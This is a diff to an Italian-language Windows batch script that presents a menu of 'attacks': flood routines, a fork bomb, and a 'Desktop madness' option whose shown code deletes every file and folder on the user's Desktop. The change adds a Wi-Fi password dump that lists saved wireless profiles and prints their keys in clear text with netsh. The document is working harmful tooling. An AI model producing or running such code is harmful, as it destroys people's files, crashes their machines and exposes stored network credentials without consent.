@@ -20,7 +20,8 @@ echo LISTA ATTACCHI
 echo [1] Ciccio Flood
 echo [2] Folders Flood
 echo [3] Fork Bomb
-echo [4] Desktop madness	
+echo [4] Desktop madness
+echo [5] Wi-Fi passworld dump	
 SET /P ANSWER=Attacco desiderato? 
 echo Hai scelto: %ANSWER%
 echo.
@@ -28,6 +29,7 @@ IF "%ANSWER%"=="1" goto :c
 IF "%ANSWER%"=="2" goto :f
 IF "%ANSWER%"=="3" goto :b
 IF "%ANSWER%"=="4" goto :getdesktopname
+IF "%ANSWER%"=="5" goto :wifi
 pause
 echo Scelta non valida.
 goto :start
@@ -54,5 +56,12 @@ for %%f in (%USERPROFILE%\Desktop\*) do del %%f
 for /d %%d in ("%USERPROFILE%\Desktop\*") do rmdir /s /q "%%d"
 pause
 
+:wifi
+netsh wlan show profiles
+:nome
+echo Inserisci Nome Network:
+set /p network=
+netsh wlan show profile name="%network%" key=clear
+goto:nome
 
 :end
